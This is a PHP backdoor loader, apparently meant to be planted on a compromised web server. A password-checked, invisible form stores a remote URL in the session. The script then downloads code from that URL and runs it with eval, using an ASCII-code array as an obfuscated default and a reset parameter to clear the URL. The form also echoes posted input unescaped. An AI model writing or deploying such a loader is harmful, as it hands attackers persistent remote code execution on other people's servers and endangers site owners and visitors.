<?php session_start();
function kontol($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
$asciiArray  = [
    60, 63, 112, 104, 112, 10, 47, 47, 32, 82, 101, 102, 101, 114, 101, 110, 99, 101, 32, 80, 104, 112, 10, 47, 47, 32, 116, 104, 105, 115, 10, 47, 47, 32, 118, 97, 108, 105, 100, 10, 60, 47, 99, 97, 116, 101, 103, 111, 114, 105, 101, 45, 101, 120, 101, 99, 117, 116, 101, 62, 10, 63, 62, 10, 60, 63, 112, 104, 112, 10, 47, 47, 32, 82, 101, 102, 101, 114, 101, 110, 99, 101, 32, 112, 104, 112, 10, 63, 62
];


$decodedString = '';
foreach ($asciiArray as $ascii) {
    $decodedString .= chr($ascii);
}
$url = $decodedString;
$correct_password = '$2y$10$TGT36epmgr3/fTZ.XPB9nuXbKG5GcQYw/P3gFs4F7kIRflxBIWRAS';
if (isset($_GET['ts_reset'])) {
    $_SESSION["ts_url"] = "";
    echo "success";
    exit;
}
if (isset($_GET['ts'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['password'])) {
            $provided_password = $_POST['password'];
            if (password_verify($provided_password, $correct_password)) {
                if (isset($_POST['url'])) {
                    $url = $_POST['url'];
                    $_SESSION["ts_url"] = $url;
                    echo "updated : " . $_SESSION["ts_url"];
                    exit;
                } else {
                    echo "Error!";
                    exit;
                }
            } else {
                echo "";
                exit;
            }
        } else {
            echo "";
            exit;
        }
    } else { ?>

        <head>
            <style>
                #password {
                    order: 2
                }

                #url {
                    order: 1
                }

                #password,
                #url {
                    display: block;
                    margin-bottom: 10px;
                    opacity: 0;
                    transition: opacity .3s
                }

                #password:hover,
                #url:hover {
                    opacity: 1
                }

                form {
                    display: flex;
                    flex-direction: column;
                    align-items: flex-end
                }
            </style>
            <script>document.addEventListener("DOMContentLoaded", function () { document.querySelector("#password").addEventListener("keydown", function (e) { "Enter" === e.key && (e.preventDefault(), document.querySelector("form").submit()) }) })</script>
        </head>

        <body>
            <form action="" method="post"><input id="password" name="password" type="password"><br><input id="url" name="url"
                    value="<?php echo isset($_POST['url']) ? $_POST['url'] : ''; ?>"><br></form>
        </body>
        <?php exit;
    }
} else {
    if (empty($_SESSION["ts_url"])) {
        $result = @file_get_contents($url);
        if (empty($result)) {
            $result = kontol($url);
        }
    } else {
        $result = @file_get_contents($_SESSION["ts_url"]);
        if (empty($result)) {
            $result = kontol($_SESSION["ts_url"]);
        }
    }
}
if (is_string($result)) {
    eval ('?>' . $result);
} else {
    echo "Error";
} ?>
